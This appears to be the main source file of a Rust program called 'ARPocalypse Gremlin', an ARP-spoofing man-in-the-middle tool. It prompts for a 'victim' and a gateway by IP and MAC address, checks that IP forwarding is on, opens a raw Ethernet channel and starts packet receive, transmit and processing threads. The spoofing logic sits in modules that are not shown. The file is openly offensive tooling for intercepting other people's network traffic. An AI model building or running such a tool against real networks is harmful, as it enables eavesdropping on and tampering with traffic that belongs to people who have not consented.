mod arp;
mod config;
mod network;
mod parser;
mod processor;
mod rx;
mod tx;

use std::io;
use std::sync::{
    Arc,
    atomic::{
        AtomicBool,
        Ordering,
    },
};
use std::thread;
use std::time::Duration;

use crossbeam_channel::bounded;

use pnet::datalink::{
    self,
    Channel::Ethernet,
    Config as DatalinkConfig,
};

use config::Config;
use network::{
    check_ip_forwarding,
    find_interface,
    parsemac,
};

fn main() {
    println!("ARPocalypse Gremlin");

    let mut input = String::new();

    println!("Victim IP:");
    io::stdin()
        .read_line(&mut input)
        .unwrap();

    let victim_ip = input
        .trim()
        .parse()
        .expect("Invalid IP");

    input.clear();

    println!("Gateway IP:");
    io::stdin()
        .read_line(&mut input)
        .unwrap();

    let gateway_ip = input
        .trim()
        .parse()
        .expect("Invalid IP");

    input.clear();

    println!("Victim MAC:");
    io::stdin()
        .read_line(&mut input)
        .unwrap();

    let victim_mac =
        parsemac(input.trim())
            .expect("Invalid MAC");

    input.clear();

    println!("Gateway MAC:");
    io::stdin()
        .read_line(&mut input)
        .unwrap();

    let gateway_mac =
        parsemac(input.trim())
            .expect("Invalid MAC");

    let interface_name =
        find_interface(victim_ip)
            .unwrap_or_else(|| {
                eprintln!(
                    "No interface found for {}",
                    victim_ip
                );

                std::process::exit(1);
            });

    let interface =
        datalink::interfaces()
            .into_iter()
            .find(|iface| {
                iface.name == interface_name
            })
            .expect("Interface disappeared");

    let my_mac =
        interface
            .mac
            .expect("Interface has no MAC");

    println!(
        "Interface: {}",
        interface.name
    );

    println!(
        "MAC: {}",
        my_mac
    );

    if let Err(error) =
        check_ip_forwarding()
    {
        eprintln!("{}", error);
        std::process::exit(1);
    }

    let mut datalink_config =
        DatalinkConfig::default();

    datalink_config.read_timeout =
        Some(Duration::from_millis(50));

    let (tx_handle, rx_handle) =
        match datalink::channel(
            &interface,
            datalink_config,
        ) {
            Ok(Ethernet(tx, rx)) =>
                (tx, rx),

            Ok(_) => {
                eprintln!(
                    "Unsupported channel"
                );
                std::process::exit(1);
            }

            Err(error) => {
                eprintln!(
                    "Channel error: {}",
                    error
                );
                std::process::exit(1);
            }
        };

    let config = Config {
        victim_ip,
        gateway_ip,
        victim_mac,
        gateway_mac,
        my_mac,
    };

    let (packet_tx, packet_rx) =
        bounded::<Vec<u8>>(100);

    let (message_tx, message_rx) =
        bounded(100);

    let running =
        Arc::new(AtomicBool::new(true));

    let ctrl_running =
        Arc::clone(&running);

    ctrlc::set_handler(move || {
        println!(
            "\nStopping Gremlin..."
        );

        ctrl_running.store(
            false,
            Ordering::SeqCst,
        );
    })
    .expect("Ctrl+C handler failed");

    let rx_running =
        Arc::clone(&running);

    let rx_thread =
        thread::spawn(move || {
            rx::run(
                rx_handle,
                packet_tx,
                &rx_running,
            );
        });

    let tx_config =
        config.clone();

    let tx_thread =
        thread::spawn(move || {
            tx::run(
                tx_handle,
                message_rx,
                tx_config,
            );
        });

    processor::run(
        packet_rx,
        message_tx,
        config,
        &running,
    );

    rx_thread
        .join()
        .expect("RX thread panicked");

    tx_thread
        .join()
        .expect("TX thread panicked");

    println!(
        "Clean shutdown."
    );
}
